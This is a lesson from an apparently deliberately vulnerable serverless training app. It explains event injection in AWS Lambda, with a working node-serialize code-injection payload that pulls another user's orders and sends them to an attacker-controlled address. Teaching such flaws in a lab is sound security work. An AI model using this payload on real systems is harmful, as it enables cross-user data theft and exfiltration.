# LESSON #1: Event Injection

## (1.1) Code Injection via API Gateway
The application sends all request to an API GW (*https://{string}.execute-api.{region}.amazonaws.com/{stage}/order*). 
All reqursts end up being handled by Lambda function, which invokes another lambda based on the incoming request.

**This function is vulnerable to Code Injection**. The function uses an insecure de-/serialization for the data in the request.

Using the following payload, it is possible to inject code that will be executed by the functioin.

`$$ND_FUNC$$_function (){}()`

For example, to get the orders of another user, we can send the payload:
```
{"action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p = {FunctionName: \"DVSA-ORDER-ORDERS\", InvocationType: \"RequestResponse\", Payload: JSON.stringify({\"user\": \"12312312-1233-1233-1233-123123123123\"})};lambda.invoke(p,function(e,d){ var h=require(\"http\");h.get(\"<ATTACKER_REMOTE_ADDRESS>\"+JSON.stringify(d));}); }()", "cart-id":""}
```

Where the *12312312-1233-1233-1233-123123123123* is the user-id of the user we want to steal the data from, and *<ATTACKER_REMOTE_ADDRESS>* is any address that we can send the data to. E.g. [ngrok](https://ngrok.com/).

As a result, we now have the user ordrs:

![alt ngrok](https://i.imgur.com/CAcywDz.png)

The above exmaple is the least of problems you can do with such an attack. Notice that there also admin functions :)


- - - 
## (1.2) Command Injection via S3 bucket
Event injections are not all about API calls and in serverless application, the source of the injection could be an email (file, subject, etc.), an MQTT pub/sub or any other cloud-resource event.

In this case, the DVSA is vulnerable to Command Injection via file name. The file is processed when uploaded to an S3 bucket. Since the bucket is configured insecurely, we can exploit it. 

To learn about this exploit, visit [Lesson #4: Insecure Cloud Configuration](../LESSONS/LESSON_04.md).

- - - 
[<- ToC](../LESSONS/README.md)

[Lesson #2 ->](../LESSONS/LESSON_02.md)
